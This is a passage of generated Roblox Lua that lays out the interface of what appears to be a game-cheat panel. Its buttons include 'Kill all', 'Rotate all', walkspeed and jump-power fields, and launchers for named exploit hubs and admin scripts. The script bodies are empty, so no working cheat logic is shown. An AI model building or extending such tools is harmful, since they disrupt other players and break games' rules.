		G2L["66"]["BorderSizePixel"] = 0;
		G2L["66"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["66"]["TextSize"] = 14;
		G2L["66"]["TextScaled"] = true;
		G2L["66"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["66"]["RichText"] = true;
		G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["66"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["66"]["Size"] = UDim2.new(0.80548, 0, -0.14651, 0);
		G2L["66"]["Name"] = [[hd]];
		G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["66"]["Text"] = [[HDAdminWorkspaceFolder ( ONLY IN HD ADMIN GAMES )]];
		G2L["66"]["Position"] = UDim2.new(0.51169, 0, 0.30464, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.hd.LocalScript
		G2L["67"] = Instance.new("LocalScript", G2L["66"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.hd.UITextSizeConstraint
		G2L["68"] = Instance.new("UITextSizeConstraint", G2L["66"]);
		G2L["68"]["MaxTextSize"] = 33;
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.kill
		G2L["69"] = Instance.new("TextButton", G2L["5e"]);
		G2L["69"]["TextWrapped"] = true;
		G2L["69"]["BorderSizePixel"] = 0;
		G2L["69"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["69"]["TextSize"] = 14;
		G2L["69"]["TextScaled"] = true;
		G2L["69"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["69"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["69"]["Size"] = UDim2.new(0.80548, 0, -0.13504, 0);
		G2L["69"]["Name"] = [[kill]];
		G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["69"]["Text"] = [[Kill all]];
		G2L["69"]["Position"] = UDim2.new(0.51169, 0, 0.47074, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.kill.LocalScript
		G2L["6a"] = Instance.new("LocalScript", G2L["69"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.kill.UITextSizeConstraint
		G2L["6b"] = Instance.new("UITextSizeConstraint", G2L["69"]);
		G2L["6b"]["MaxTextSize"] = 32;
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.rotate
		G2L["6c"] = Instance.new("TextButton", G2L["5e"]);
		G2L["6c"]["TextWrapped"] = true;
		G2L["6c"]["BorderSizePixel"] = 0;
		G2L["6c"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["6c"]["TextSize"] = 14;
		G2L["6c"]["TextScaled"] = true;
		G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["6c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["6c"]["Size"] = UDim2.new(0.80697, 0, -0.13046, 0);
		G2L["6c"]["Name"] = [[rotate]];
		G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6c"]["Text"] = [[Rotate all]];
		G2L["6c"]["Position"] = UDim2.new(0.51094, 0, 0.64372, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.rotate.LocalScript
		G2L["6d"] = Instance.new("LocalScript", G2L["6c"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.rotate.UITextSizeConstraint
		G2L["6e"] = Instance.new("UITextSizeConstraint", G2L["6c"]);
		G2L["6e"]["MaxTextSize"] = 31;
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.mesh
		G2L["6f"] = Instance.new("TextButton", G2L["5e"]);
		G2L["6f"]["TextWrapped"] = true;
		G2L["6f"]["BorderSizePixel"] = 0;
		G2L["6f"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["6f"]["TextSize"] = 14;
		G2L["6f"]["TextScaled"] = true;
		G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["6f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["6f"]["Size"] = UDim2.new(0.81103, 0, -0.06676, 0);
		G2L["6f"]["Name"] = [[mesh]];
		G2L["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6f"]["Text"] = [[Random Mesh all]];
		G2L["6f"]["Position"] = UDim2.new(0.50891, 0, 0.7795, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.mesh.LocalScript
		G2L["70"] = Instance.new("LocalScript", G2L["6f"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.mesh.UITextSizeConstraint
		G2L["71"] = Instance.new("UITextSizeConstraint", G2L["6f"]);
		G2L["71"]["MaxTextSize"] = 16;
	
	
		-- StarterGui.f3xmain2.Frame.main2
		G2L["72"] = Instance.new("Frame", G2L["2"]);
		G2L["72"]["Visible"] = false;
		G2L["72"]["BorderSizePixel"] = 0;
		G2L["72"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["72"]["Size"] = UDim2.new(0.96552, 0, 0.77035, 0);
		G2L["72"]["Position"] = UDim2.new(0.02002, 0, 0.1657, 0);
		G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["72"]["Name"] = [[main2]];
	
	
		-- StarterGui.f3xmain2.Frame.main2.UIStroke
		G2L["73"] = Instance.new("UIStroke", G2L["72"]);
		G2L["73"]["Thickness"] = 2;
		G2L["73"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer
		G2L["74"] = Instance.new("Frame", G2L["72"]);
		G2L["74"]["BorderSizePixel"] = 0;
		G2L["74"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
		G2L["74"]["Size"] = UDim2.new(0.44643, 0, 0.91321, 0);
		G2L["74"]["Position"] = UDim2.new(0.02679, 0, 0.04151, 0);
		G2L["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["74"]["Name"] = [[localplayer]];
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.UIStroke
		G2L["75"] = Instance.new("UIStroke", G2L["74"]);
		G2L["75"]["Thickness"] = 2;
		G2L["75"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.TextLabel
		G2L["76"] = Instance.new("TextLabel", G2L["74"]);
		G2L["76"]["TextWrapped"] = true;
		G2L["76"]["BorderSizePixel"] = 0;
		G2L["76"]["TextSize"] = 14;
		G2L["76"]["TextScaled"] = true;
		G2L["76"]["BackgroundColor3"] = Color3.fromRGB(7, 9, 19);
		G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["76"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["76"]["Size"] = UDim2.new(1, 0, 0.13223, 0);
		G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["76"]["Text"] = [[Local Player]];
		G2L["76"]["Position"] = UDim2.new(0, 0, 0.86777, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.TextLabel.UIStroke
		G2L["77"] = Instance.new("UIStroke", G2L["76"]);
		G2L["77"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
		G2L["77"]["Thickness"] = 2;
		G2L["77"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.TextLabel.UITextSizeConstraint
		G2L["78"] = Instance.new("UITextSizeConstraint", G2L["76"]);
		G2L["78"]["MaxTextSize"] = 28;
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.trail
		G2L["79"] = Instance.new("TextButton", G2L["74"]);
		G2L["79"]["TextWrapped"] = true;
		G2L["79"]["BorderSizePixel"] = 0;
		G2L["79"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["79"]["TextSize"] = 14;
		G2L["79"]["TextScaled"] = true;
		G2L["79"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["79"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["79"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["79"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["79"]["Name"] = [[trail]];
		G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["79"]["Text"] = [[Trail]];
		G2L["79"]["Position"] = UDim2.new(0.28103, 0, 0.12937, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.trail.LocalScript
		G2L["7a"] = Instance.new("LocalScript", G2L["79"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.trail.UITextSizeConstraint
		G2L["7b"] = Instance.new("UITextSizeConstraint", G2L["79"]);
		G2L["7b"]["MaxTextSize"] = 33;
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.laserknife
		G2L["7c"] = Instance.new("TextButton", G2L["74"]);
		G2L["7c"]["TextWrapped"] = true;
		G2L["7c"]["BorderSizePixel"] = 0;
		G2L["7c"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["7c"]["TextSize"] = 14;
		G2L["7c"]["TextScaled"] = true;
		G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["7c"]["RichText"] = true;
		G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["7c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["7c"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["7c"]["Name"] = [[laserknife]];
		G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7c"]["Text"] = [[laserknife (not mine, credits to sauga77kjk)]];
		G2L["7c"]["Position"] = UDim2.new(0.72103, 0, 0.12937, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.laserknife.LocalScript
		G2L["7d"] = Instance.new("LocalScript", G2L["7c"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.laserknife.UITextSizeConstraint
		G2L["7e"] = Instance.new("UITextSizeConstraint", G2L["7c"]);
		G2L["7e"]["MaxTextSize"] = 44;
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.walkspeed
		G2L["7f"] = Instance.new("TextButton", G2L["74"]);
		G2L["7f"]["TextWrapped"] = true;
		G2L["7f"]["BorderSizePixel"] = 0;
		G2L["7f"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["7f"]["Modal"] = true;
		G2L["7f"]["TextSize"] = 14;
		G2L["7f"]["TextScaled"] = true;
		G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["7f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["7f"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["7f"]["Name"] = [[walkspeed]];
		G2L["7f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7f"]["Text"] = [[Walkspeed]];
		G2L["7f"]["Position"] = UDim2.new(0.28103, 0, 0.38144, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.walkspeed.LocalScript
		G2L["80"] = Instance.new("LocalScript", G2L["7f"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.walkspeed.UITextSizeConstraint
		G2L["81"] = Instance.new("UITextSizeConstraint", G2L["7f"]);
		G2L["81"]["MaxTextSize"] = 12;
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.jump
		G2L["82"] = Instance.new("TextButton", G2L["74"]);
		G2L["82"]["TextWrapped"] = true;
		G2L["82"]["BorderSizePixel"] = 0;
		G2L["82"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["82"]["Modal"] = true;
		G2L["82"]["TextSize"] = 14;
		G2L["82"]["TextScaled"] = true;
		G2L["82"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["82"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["82"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["82"]["Name"] = [[jump]];
		G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["82"]["Text"] = [[Jump Power]];
		G2L["82"]["Position"] = UDim2.new(0.28103, 0, 0.62111, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.jump.LocalScript
		G2L["83"] = Instance.new("LocalScript", G2L["82"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.jump.UITextSizeConstraint
		G2L["84"] = Instance.new("UITextSizeConstraint", G2L["82"]);
		G2L["84"]["MaxTextSize"] = 44;
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.speed
		G2L["85"] = Instance.new("TextBox", G2L["74"]);
		G2L["85"]["Name"] = [[speed]];
		G2L["85"]["PlaceholderColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["85"]["BorderSizePixel"] = 0;
		G2L["85"]["TextWrapped"] = true;
		G2L["85"]["TextSize"] = 14;
		G2L["85"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["85"]["TextScaled"] = true;
		G2L["85"]["BackgroundColor3"] = Color3.fromRGB(77, 77, 77);
		G2L["85"]["RichText"] = true;
		G2L["85"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["85"]["PlaceholderText"] = [[walkspeed]];
		G2L["85"]["Size"] = UDim2.new(0.36667, 0, 0.20661, 0);
		G2L["85"]["Position"] = UDim2.new(0.53333, 0, 0.27686, 0);
		G2L["85"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["85"]["Text"] = [[]];
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.speed.UITextSizeConstraint
		G2L["86"] = Instance.new("UITextSizeConstraint", G2L["85"]);
		G2L["86"]["MaxTextSize"] = 10;
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.jump
		G2L["87"] = Instance.new("TextBox", G2L["74"]);
		G2L["87"]["Name"] = [[jump]];
		G2L["87"]["PlaceholderColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["87"]["BorderSizePixel"] = 0;
		G2L["87"]["TextWrapped"] = true;
		G2L["87"]["TextSize"] = 14;
		G2L["87"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["87"]["TextScaled"] = true;
		G2L["87"]["BackgroundColor3"] = Color3.fromRGB(77, 77, 77);
		G2L["87"]["RichText"] = true;
		G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["87"]["PlaceholderText"] = [[jumppower]];
		G2L["87"]["Size"] = UDim2.new(0.36667, 0, 0.20661, 0);
		G2L["87"]["Position"] = UDim2.new(0.53333, 0, 0.5124, 0);
		G2L["87"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["87"]["Text"] = [[]];
	
	
		-- StarterGui.f3xmain2.Frame.main2.localplayer.jump.UITextSizeConstraint
		G2L["88"] = Instance.new("UITextSizeConstraint", G2L["87"]);
		G2L["88"]["MaxTextSize"] = 9;
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd
		G2L["89"] = Instance.new("Frame", G2L["72"]);
		G2L["89"]["BorderSizePixel"] = 0;
		G2L["89"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
		G2L["89"]["Size"] = UDim2.new(0.44643, 0, 0.49155, 0);
		G2L["89"]["Position"] = UDim2.new(0.52095, 0, 0.04151, 0);
		G2L["89"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["89"]["Name"] = [[hd]];
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.UIStroke
		G2L["8a"] = Instance.new("UIStroke", G2L["89"]);
		G2L["8a"]["Thickness"] = 2;
		G2L["8a"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.TextLabel
		G2L["8b"] = Instance.new("TextLabel", G2L["89"]);
		G2L["8b"]["TextWrapped"] = true;
		G2L["8b"]["BorderSizePixel"] = 0;
		G2L["8b"]["TextSize"] = 14;
		G2L["8b"]["TextScaled"] = true;
		G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["8b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["8b"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["8b"]["Size"] = UDim2.new(1, 0, 0.13223, 0);
		G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["8b"]["Text"] = [[HD Admin Scripts]];
		G2L["8b"]["Position"] = UDim2.new(0, 0, 0.86777, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.TextLabel.UIStroke
		G2L["8c"] = Instance.new("UIStroke", G2L["8b"]);
		G2L["8c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
		G2L["8c"]["Thickness"] = 2;
		G2L["8c"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.TextLabel.UITextSizeConstraint
		G2L["8d"] = Instance.new("UITextSizeConstraint", G2L["8b"]);
		G2L["8d"]["MaxTextSize"] = 28;
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.MML
		G2L["8e"] = Instance.new("TextButton", G2L["89"]);
		G2L["8e"]["TextWrapped"] = true;
		G2L["8e"]["BorderSizePixel"] = 0;
		G2L["8e"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["8e"]["Modal"] = true;
		G2L["8e"]["TextSize"] = 14;
		G2L["8e"]["TextScaled"] = true;
		G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["8e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["8e"]["Size"] = UDim2.new(0.81523, 0, -0.1961, 0);
		G2L["8e"]["Name"] = [[MML]];
		G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["8e"]["Text"] = [[MML Admin]];
		G2L["8e"]["Position"] = UDim2.new(0.51006, 0, 0.15046, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.MML.LocalScript
		G2L["8f"] = Instance.new("LocalScript", G2L["8e"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.MML.UITextSizeConstraint
		G2L["90"] = Instance.new("UITextSizeConstraint", G2L["8e"]);
		G2L["90"]["MaxTextSize"] = 44;
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.gghub
		G2L["91"] = Instance.new("TextButton", G2L["89"]);
		G2L["91"]["TextWrapped"] = true;
		G2L["91"]["BorderSizePixel"] = 0;
		G2L["91"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["91"]["Modal"] = true;
		G2L["91"]["TextSize"] = 14;
		G2L["91"]["TextScaled"] = true;
		G2L["91"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["91"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["91"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["91"]["Size"] = UDim2.new(0.81523, 0, -0.1961, 0);
		G2L["91"]["Name"] = [[gghub]];
		G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["91"]["Text"] = [[GG Hub Remastered]];
		G2L["91"]["Position"] = UDim2.new(0.51006, 0, 0.49691, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.gghub.LocalScript
		G2L["92"] = Instance.new("LocalScript", G2L["91"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main2.hd.gghub.UITextSizeConstraint
		G2L["93"] = Instance.new("UITextSizeConstraint", G2L["91"]);
		G2L["93"]["MaxTextSize"] = 44;
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal
		G2L["94"] = Instance.new("Frame", G2L["72"]);
		G2L["94"]["BorderSizePixel"] = 0;
		G2L["94"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
		G2L["94"]["Size"] = UDim2.new(0.44643, 0, 0.36466, 0);
		G2L["94"]["Position"] = UDim2.new(0.52095, 0, 0.58932, 0);
		G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["94"]["Name"] = [[universal]];
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.UIStroke
		G2L["95"] = Instance.new("UIStroke", G2L["94"]);
		G2L["95"]["Thickness"] = 2;
		G2L["95"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.TextLabel
		G2L["96"] = Instance.new("TextLabel", G2L["94"]);
		G2L["96"]["TextWrapped"] = true;
		G2L["96"]["BorderSizePixel"] = 0;
		G2L["96"]["TextSize"] = 14;
		G2L["96"]["TextScaled"] = true;
		G2L["96"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["96"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["96"]["Size"] = UDim2.new(1, 0, 0.27717, 0);
		G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["96"]["Text"] = [[Universal]];
		G2L["96"]["Position"] = UDim2.new(0, 0, 0.72283, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.TextLabel.UIStroke
		G2L["97"] = Instance.new("UIStroke", G2L["96"]);
		G2L["97"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
		G2L["97"]["Thickness"] = 2;
		G2L["97"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.TextLabel.UITextSizeConstraint
		G2L["98"] = Instance.new("UITextSizeConstraint", G2L["96"]);
		G2L["98"]["MaxTextSize"] = 28;
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.rc7
		G2L["99"] = Instance.new("TextButton", G2L["94"]);
		G2L["99"]["TextWrapped"] = true;
		G2L["99"]["BorderSizePixel"] = 0;
		G2L["99"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["99"]["Modal"] = true;
		G2L["99"]["TextSize"] = 14;
		G2L["99"]["TextScaled"] = true;
		G2L["99"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["99"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["99"]["Size"] = UDim2.new(0.81523, 0, -0.1961, 0);
		G2L["99"]["Name"] = [[rc7]];
		G2L["99"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["99"]["Text"] = [[RC7]];
		G2L["99"]["Position"] = UDim2.new(0.51006, 0, 0.15046, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.rc7.LocalScript
		G2L["9a"] = Instance.new("LocalScript", G2L["99"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.rc7.UITextSizeConstraint
		G2L["9b"] = Instance.new("UITextSizeConstraint", G2L["99"]);
		G2L["9b"]["MaxTextSize"] = 44;
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.sirius
		G2L["9c"] = Instance.new("TextButton", G2L["94"]);
		G2L["9c"]["TextWrapped"] = true;
		G2L["9c"]["BorderSizePixel"] = 0;
		G2L["9c"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["9c"]["Modal"] = true;
		G2L["9c"]["TextSize"] = 14;
		G2L["9c"]["TextScaled"] = true;
		G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["9c"]["RichText"] = true;
		G2L["9c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["9c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["9c"]["Size"] = UDim2.new(0.81523, 0, -0.1961, 0);
		G2L["9c"]["Name"] = [[sirius]];
		G2L["9c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9c"]["Text"] = [[Sirius (credits to the owners)]];
		G2L["9c"]["Position"] = UDim2.new(0.51006, 0, 0.49691, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.sirius.LocalScript
		G2L["9d"] = Instance.new("LocalScript", G2L["9c"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main2.universal.sirius.UITextSizeConstraint
		G2L["9e"] = Instance.new("UITextSizeConstraint", G2L["9c"]);
		G2L["9e"]["MaxTextSize"] = 44;
	
	
		-- StarterGui.f3xmain2.Frame.switch
		G2L["9f"] = Instance.new("TextButton", G2L["2"]);
		G2L["9f"]["TextWrapped"] = true;
		G2L["9f"]["BorderSizePixel"] = 0;
		G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["9f"]["TextSize"] = 14;
		G2L["9f"]["TextScaled"] = true;
		G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["9f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["9f"]["Size"] = UDim2.new(0.10588, 0, 0.79651, 0);
		G2L["9f"]["Name"] = [[switch]];
		G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9f"]["Text"] = [[Page 1]];
		G2L["9f"]["Position"] = UDim2.new(1.07667, 0, 0.56189, 0);
	
	
		-- StarterGui.f3xmain2.Frame.switch.UIStroke
		G2L["a0"] = Instance.new("UIStroke", G2L["9f"]);
		G2L["a0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
		G2L["a0"]["Thickness"] = 2;
		G2L["a0"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.switch.LocalScript
		G2L["a1"] = Instance.new("LocalScript", G2L["9f"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.switch.UITextSizeConstraint
		G2L["a2"] = Instance.new("UITextSizeConstraint", G2L["9f"]);
		G2L["a2"]["MaxTextSize"] = 48;
	
	
		-- StarterGui.f3xmain2.Frame.main3
		G2L["a3"] = Instance.new("Frame", G2L["2"]);
		G2L["a3"]["Visible"] = false;
		G2L["a3"]["BorderSizePixel"] = 0;
		G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a3"]["Size"] = UDim2.new(0.96552, 0, 0.77035, 0);
		G2L["a3"]["Position"] = UDim2.new(0.02002, 0, 0.1657, 0);
		G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a3"]["Name"] = [[main3]];
	
	
		-- StarterGui.f3xmain2.Frame.main3.UIStroke
		G2L["a4"] = Instance.new("UIStroke", G2L["a3"]);
		G2L["a4"]["Thickness"] = 2;
		G2L["a4"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies
		G2L["a5"] = Instance.new("Frame", G2L["a3"]);
		G2L["a5"]["BorderSizePixel"] = 0;
		G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
		G2L["a5"]["Size"] = UDim2.new(0.94204, 0, 0.91321, 0);
		G2L["a5"]["Position"] = UDim2.new(0.02679, 0, 0.04151, 0);
		G2L["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a5"]["Name"] = [[skies]];
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.UIStroke
		G2L["a6"] = Instance.new("UIStroke", G2L["a5"]);
		G2L["a6"]["Thickness"] = 2;
		G2L["a6"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.TextLabel
		G2L["a7"] = Instance.new("TextLabel", G2L["a5"]);
		G2L["a7"]["TextWrapped"] = true;
		G2L["a7"]["BorderSizePixel"] = 0;
